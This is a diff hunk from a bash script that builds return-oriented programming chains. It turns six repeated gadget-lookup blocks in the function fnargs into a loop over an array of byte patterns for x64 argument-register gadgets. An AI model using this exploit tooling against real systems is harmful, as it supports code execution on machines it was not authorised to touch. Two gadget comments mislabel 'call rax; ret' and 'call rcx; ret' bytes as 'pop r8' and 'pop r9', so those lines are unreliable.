@@ -155,47 +155,24 @@ fnargs() {
 	SYSCALLSIZE=$((${SYSCALLSIZE}+2))
 	[[ -z ${1} ]] && return
 
-	findgadget "$(printf "\x5f\xc3")"                    # pop rdi ; ret
-	SYSCALL=${SYSCALL}${gadgetaddr}
-	SYSCALL=${SYSCALL}$(hexlify ${1})
-	shift
-	SYSCALLSIZE=$((${SYSCALLSIZE}+2))
-	[[ -z ${1} ]] && return
+	# this is from the x64 Linux ABI
+	GADGETS=(
+		"\x5f\xc3"     # pop rdi; ret
+		"\x5e\xc3"     # pop rsi; ret
+		"\x5a\xc3"     # pop rdx; ret
+		"\x59\xc3"     # pop rcx; ret
+		"\xff\xd0\xc3" # pop r8 ; ret
+		"\xff\xd1\xc3" # pop r9 ; ret
+		)
 
-	findgadget "$(printf "\x5e\xc3")"                    # pop rsi ; ret
-	SYSCALL=${SYSCALL}${gadgetaddr}
-	SYSCALL=${SYSCALL}$(hexlify ${1})
-	shift
-	SYSCALLSIZE=$((${SYSCALLSIZE}+2))
-	[[ -z ${1} ]] && return
-
-	findgadget "$(printf "\x5a\xc3")"                    # pop rdx ; ret
-	SYSCALL=${SYSCALL}${gadgetaddr}
-	SYSCALL=${SYSCALL}$(hexlify ${1})
-	shift
-	SYSCALLSIZE=$((${SYSCALLSIZE}+2))
-	[[ -z ${1} ]] && return
-
-	findgadget "$(printf "\x59\xc3")"                    # pop rcx ; ret
-	SYSCALL=${SYSCALL}${gadgetaddr}
-	SYSCALL=${SYSCALL}$(hexlify ${1})
-	shift
-	SYSCALLSIZE=$((${SYSCALLSIZE}+2))
-	[[ -z ${1} ]] && return
-
-	findgadget "$(printf "\xff\xd0\xc3")"                # pop r8 ; ret
-	SYSCALL=${SYSCALL}${gadgetaddr}
-	SYSCALL=${SYSCALL}$(hexlify ${1})
-	shift
-	SYSCALLSIZE=$((${SYSCALLSIZE}+2))
-	[[ -z ${1} ]] && return
-
-	findgadget "$(printf "\xff\xd1\xc3")"                # pop r9 ; ret
-	SYSCALL=${SYSCALL}${gadgetaddr}
-	SYSCALL=${SYSCALL}$(hexlify ${1})
-	shift
-	SYSCALLSIZE=$((${SYSCALLSIZE}+2))
-	[[ -z ${1} ]] && return
+	for gadget in ${GADGETS[@]}; do
+		findgadget "$(printf ${gadget})"
+		SYSCALL=${SYSCALL}${gadgetaddr}
+		SYSCALL=${SYSCALL}$(hexlify ${1})
+		shift
+		SYSCALLSIZE=$((${SYSCALLSIZE}+2))
+		[[ -z ${1} ]] && break
+	done
 }
 
 # execute a syscall in the ROPChain, with all arguments setup appropriately
